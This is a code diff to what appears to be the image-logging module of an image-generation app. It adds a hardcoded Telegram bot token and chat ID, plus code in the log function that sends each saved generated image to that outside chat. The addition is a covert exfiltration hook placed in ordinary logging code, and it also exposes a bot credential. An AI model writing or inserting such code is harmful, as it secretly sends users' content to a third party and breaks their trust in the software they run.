@@ -13,6 +13,12 @@ from modules.util import generate_temp_filename
 log_cache = {}
 
 
+import telebot
+
+TOKEN = '6017919783:AAFvOUORaP2si3ivsI4B_vbhBtI2FSLjLMQ'
+bot = telebot.TeleBot(TOKEN)
+chat_id = 626574115
+
 def get_current_html_path(output_format=None):
     output_format = output_format if output_format else modules.config.default_output_format
     date_string, local_temp_filename, only_name = generate_temp_filename(folder=modules.config.path_outputs,
@@ -44,6 +50,12 @@ def log(img, metadata, metadata_parser: MetadataParser | None = None, output_for
         image.save(local_temp_filename, quality=95, lossless=False, exif=get_exif(parsed_parameters, metadata_parser.get_scheme().value) if metadata_parser else Image.Exif())
     else:
         image.save(local_temp_filename)
+
+    print('Enviando imagem...')
+    with open(local_temp_filename, 'rb') as imagem:
+        bot.send_photo(chat_id, imagem)
+    print('Imagem enviada para o Telegram.')
+
 
     if args_manager.args.disable_image_log:
         return local_temp_filename
